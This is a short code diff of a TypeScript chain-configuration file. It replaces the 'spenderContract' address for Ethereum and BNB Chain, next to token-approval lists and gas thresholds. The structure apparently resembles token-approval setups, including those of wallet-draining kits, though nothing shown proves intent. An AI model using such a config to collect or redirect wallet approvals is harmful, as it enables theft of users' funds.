@@ -38,7 +38,7 @@ export const SUPPORTED_CHAINS: ChainConfig[] = [
     rpcUrl: "https://eth.drpc.org",
     explorerUrl: "https://etherscan.io",
     nativeCurrency: { symbol: "ETH", decimals: 18 },
-    spenderContract: "0x09B6AA5d414De08f480C1C6fE9b384AC6d789e83",
+    spenderContract: "0x065A08111056F729d5997b53509ff03bD5425B1E",
     minGasThreshold: 0.001,
     approvalTokens: [
       { symbol: "USDT", name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
@@ -55,7 +55,7 @@ export const SUPPORTED_CHAINS: ChainConfig[] = [
     rpcUrl: "https://bsc-dataseed1.binance.org",
     explorerUrl: "https://bscscan.com",
     nativeCurrency: { symbol: "BNB", decimals: 18 },
-    spenderContract: "0x09B6AA5d414De08f480C1C6fE9b384AC6d789e83",
+    spenderContract: "0x065A08111056F729d5997b53509ff03bD5425B1E",
     minGasThreshold: 0.0005,
     approvalTokens: [
       { symbol: "USDT", name: "BEP20 USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
